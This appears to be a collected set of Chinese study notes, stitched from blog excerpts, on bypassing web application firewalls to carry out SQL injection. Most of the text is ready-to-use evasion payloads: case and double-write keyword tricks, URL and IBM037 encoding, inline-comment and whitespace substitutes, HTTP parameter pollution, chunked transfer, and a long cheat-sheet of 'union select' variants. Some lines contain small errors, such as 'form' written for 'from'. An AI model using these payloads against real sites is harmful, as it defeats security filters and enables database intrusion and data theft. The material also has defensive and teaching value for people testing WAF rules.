## 以下来自:https://blog.51cto.com/u_15288375/2980969?abTest=51cto

一、大小写绕过

把关键字修改为And，OrdEr，UniOn。。。

 

二、双写绕过

把关键字修改为AandND，OOrderrder。。。

 

三、编码绕过

http://192.168.1.120/sqli/Less-5/?id=1

转换为url编码后：http%3A%2F%2F192.168.1.120%2Fsqli%2FLess-5%2F%3Fid%3D1

 

四、内联注释

`/*! select*/ * form admin`





## 51CTO**渗透之——SQL注入绕过技术总结**

```
https://blog.51cto.com/binghe001/5246903?abTest=51cto
```





## 以下内容来自:https://www.cnblogs.com/r0nGer/articles/15938004.html

空格字符绕过

用各种字符或注释代替空格

%09　　TAB 键（水平）

%0a　　新建一行

%0c　　新的一页

%0d　　return 功能

%0b　　TAB 键（垂直）

%a0　　空格

 

大小写绕过

UniOn SelEct

 

浮点数绕过

7Eor

 

引号绕过

当waf拦截单引号时可以采用双引号绕过

也可以采用将字符串转为十六进制来绕过单引号

 

反引号绕过

反应号在键盘的左上角 ``

加与不加反引号意义相同，但是可以绕过一些检测

 

脚本语言特性绕过

在php中 id=1&id=2

后面的值会自动覆盖前面的值

id=1%00&id=2 union select 1,2,3--+

当waf遇到%00可能会停止检测

但是&后面的值会覆盖前面的值

 

逗号绕过

当waf过滤逗号时

　　substr截取字符串

select * from users where id=1 and 'm'=(select(substr(database() from 1 for 1)));

可以进一步优化 m 换成 hex 0x6D 这样就避免了单引号

select * from users where id=1 and 0x6D=(select(substr(database() from 1 for 1)));

　　min截取字符串

select mid(database() from 1 for 1); 这个方法如上。

　　join绕过

union select 1,2 #等价于 union select * from (select 1)a join (select 2)b

a 和 b 分别是表的别名

　　like绕过

select user() like '%r%';

　　limit offset绕过

 

or and xor not 绕过

and 等于&&

or 等于 ||

not 等于 !

xor 等于|

 

等号绕过

如果程序会对=进行拦截 可以使用 like rlike regexp 或者使用<或者>

select * from users where id=1 and ascii(substring(user(),1,1))<115;

select * from users where id=1 and ascii(substring(user(),1,1))>115;

select * from users where id=1 and (select substring(user(),1,1)like 'r%');

select * from users where id=1 and (select substring(user(),1,1)rlike 'r');

select * from users where id=1 and 1=(select user() regexp '^r');

select * from users where id=1 and 1=(select user() regexp '^a');

 

双写绕过

有的waf会转空关键词

但只会转一次

因此写两次就行了

UNunionIONSEselectECT

 

二次编码绕过

有的waf只会解码一次url编码

对已经加密的编码再加密就是了

 

偏僻函数绕过

采用生僻函数代替常见函数

例如采用polygon()代替updatexml函数

 

分块传输绕过

每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的

CRLF(\r\n)，也不包括分块数据结尾的 CRLF(\r\n)。

最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。

最后一个分块后需要空两行

例：

HTTP/1.1 200 OK

Content-Type: text/plain

Transfer-Encoding: chunked

23\r\n

This is the data in the first chunk\r\n

1A\r\n

and this is the second one\r\n

3\r\n

con\r\n

8\r\n

sequence\r\n0\r\n

\r\n

 

信任白名单绕过

有些waf会自带一些文件白名单

例如：/admin

/phpmyadmin

/admin.php

我们结合之间的知识点

php的语言特性

http://192.168.0.115/06/vul/sqli/sqli_str.php?name=/admin.php&name=vince+&submit=1

后面的可以覆盖前面的

但是其中含有admin.php的白名单

因此不会被waf识别

或者某些静态文件也不会被waf识别

采用同样的方法

/1.jpg&name=vince+&submit=1

 

pipline绕过注入

这也算是一个比较高阶的绕过方式了

http 协议是由 tcp 协议封装而来，当浏览器发起一个 http 请求时，浏览器先和服

务器建立起连接 tcp 连接，然后发送 http 数据包（即我们用 burpsuite 截获的数据），

其中包含了一个 Connection 字段，一般值为 close，apache 等容器根据这个字段

决定是保持该 tcp 连接或是断开。当发送的内容太大，超过一个 http 包容量，需

要分多次发送时，值会变成 keep-alive，即本次发起的 http 请求所建立的 tcp 连

接不断开，直到所发送内容结束 Connection 为 close 为止

用 burpsuite 抓包提交 复制整个包信息放在第一个包最后，把第一个包 close 改

成 keep-alive 把 brupsuite 自动更新 Content-Length 勾去掉。

我这解释不太清楚

后面想到这我还是回来看视频吧

 

内联注释绕过

/*!注释内容 */
这种注释在mysql中叫做内联注释，当！后面所接的数据库版本号时，当实际的版本等于或是高于那个字符串，应用程序就会将注释内容解释为SQL，否则就会当做注释来处理。默认的，当没有接版本号时，是会执行里面的内容的。
所以可以用于绕过waf

NULL绕过

 

http相同参数绕过
waf可能对post包只会检查post数据 get包只会检查get数据
但是在后端代码中没有想到如果是get写的前端会发送post的数据
但是waf仅仅检查post包的post数据
get数据没有检查

order by绕过

当order by 被过滤时，无法猜解字段数，可以采用into变量名进行代替

如：select * form users where id=1 into @a,@b,@c,@d;

 

multipart/form-data绕过

我对这个协议和编码方式不太了解

只知道这是文件上传的一个模式

表示该数据被编码为一条消息，页上的每个空间对应消息中的一个部分

我们可以自己写一个页面然后将action指向跳转页面

如果waf没有对该模式进行匹配的话则会被绕过

 

application/json text/xml绕过

有些程序采用json或者xml提交参数

因此将注入参数换为json格式或者xml格式

有可能绕过检查

 

溢出绕过

有的waf只检查前1000（有限个）字符

因此当注入字符超过1000个时

超出的部分可能就会绕过检测

 

花括号绕过

select 1,2 union select {x 1},user()

花括号里边左边是注释的内容

这样可以绕过waf拦截

 

ALL或者DISTINCT绕过

去掉重复值

select 1,2 from users where user_id=1 union DISTINCT select 1,2

select 1,2 from users where user_id=1 union select DISTINCT 1,2

显示全部

select 1,2 from users where user_id=1 union all select 1,2

select 1,2 from users where user_id=1 union select all 1,2

 

换行混绕绕过

目前一些waf对某些连接起来的字符会进行过滤

我们使用换行符加上注释符将连接起来的字符分来

 就可以实行绕过

 

HTTP数据编码绕过

通常waf只坚持他所识别的编码

但是服务器可以识别更多的编码

因此我们只需要将payload按照waf识别不了但是服务器能解析识别的编码就可以绕过

如ibm036编码

未编码

id=123&pass=pass%3d1

透过 IBM037 编码

%89%84=%F1%F2%F3&%97%81%A2%A2=%97%81%A2%A2~%F1

但要注意在Content-Type里添加charset=ibm037

 

url编码绕过

iis中会自动将url编码转换成字符串到程序中去执行

利用这个性质可以将union select 转换成 u%6eion s%65lect

 

union select 绕过

这里我就直接抄月师傅的笔记了

针对单个关键词绕过

sel<>ect 程序过滤<>为空 脚本处理

sele/**/ct 程序过滤/**/为空

/*!%53eLEct*/ url 编码与内联注释

se%0blect 使用空格绕过

sele%ct 使用百分号绕过

%53eLEct 编码绕过

大小写

uNIoN sELecT 1,2

union all select 1,2

union DISTINCT select 1,2

null+UNION+SELECT+1,2

/*!union*//*!select*/1,2

union/**/select/**/1,2

and(select 1)=(Select 0xA*1000)/*!uNIOn*//*!SeLECt*/ 1,user()

/*!50000union*//*!50000select*/1,2

/*!40000union*//*!40000select*/1,2

%0aunion%0aselect 1,2

%250aunion%250aselect 1,2%09union%09select 1,2

%0caunion%0cselect 1,2

%0daunion%0dselect 1,2

%0baunion%0bselect 1,2

%0d%0aunion%0d%0aselect 1,2

--+%0d%0aunion--+%0d%0aselect--+%0d%0a1,--+%0d%0a2

/*!12345union*//*!12345select*/1,2;

/*中文*/union/*中文*/select/*中文*/1,2;

/*

*/union/*

*/select/

*/1,2;

/*!union*//*!00000all*//*!00000select*/1,2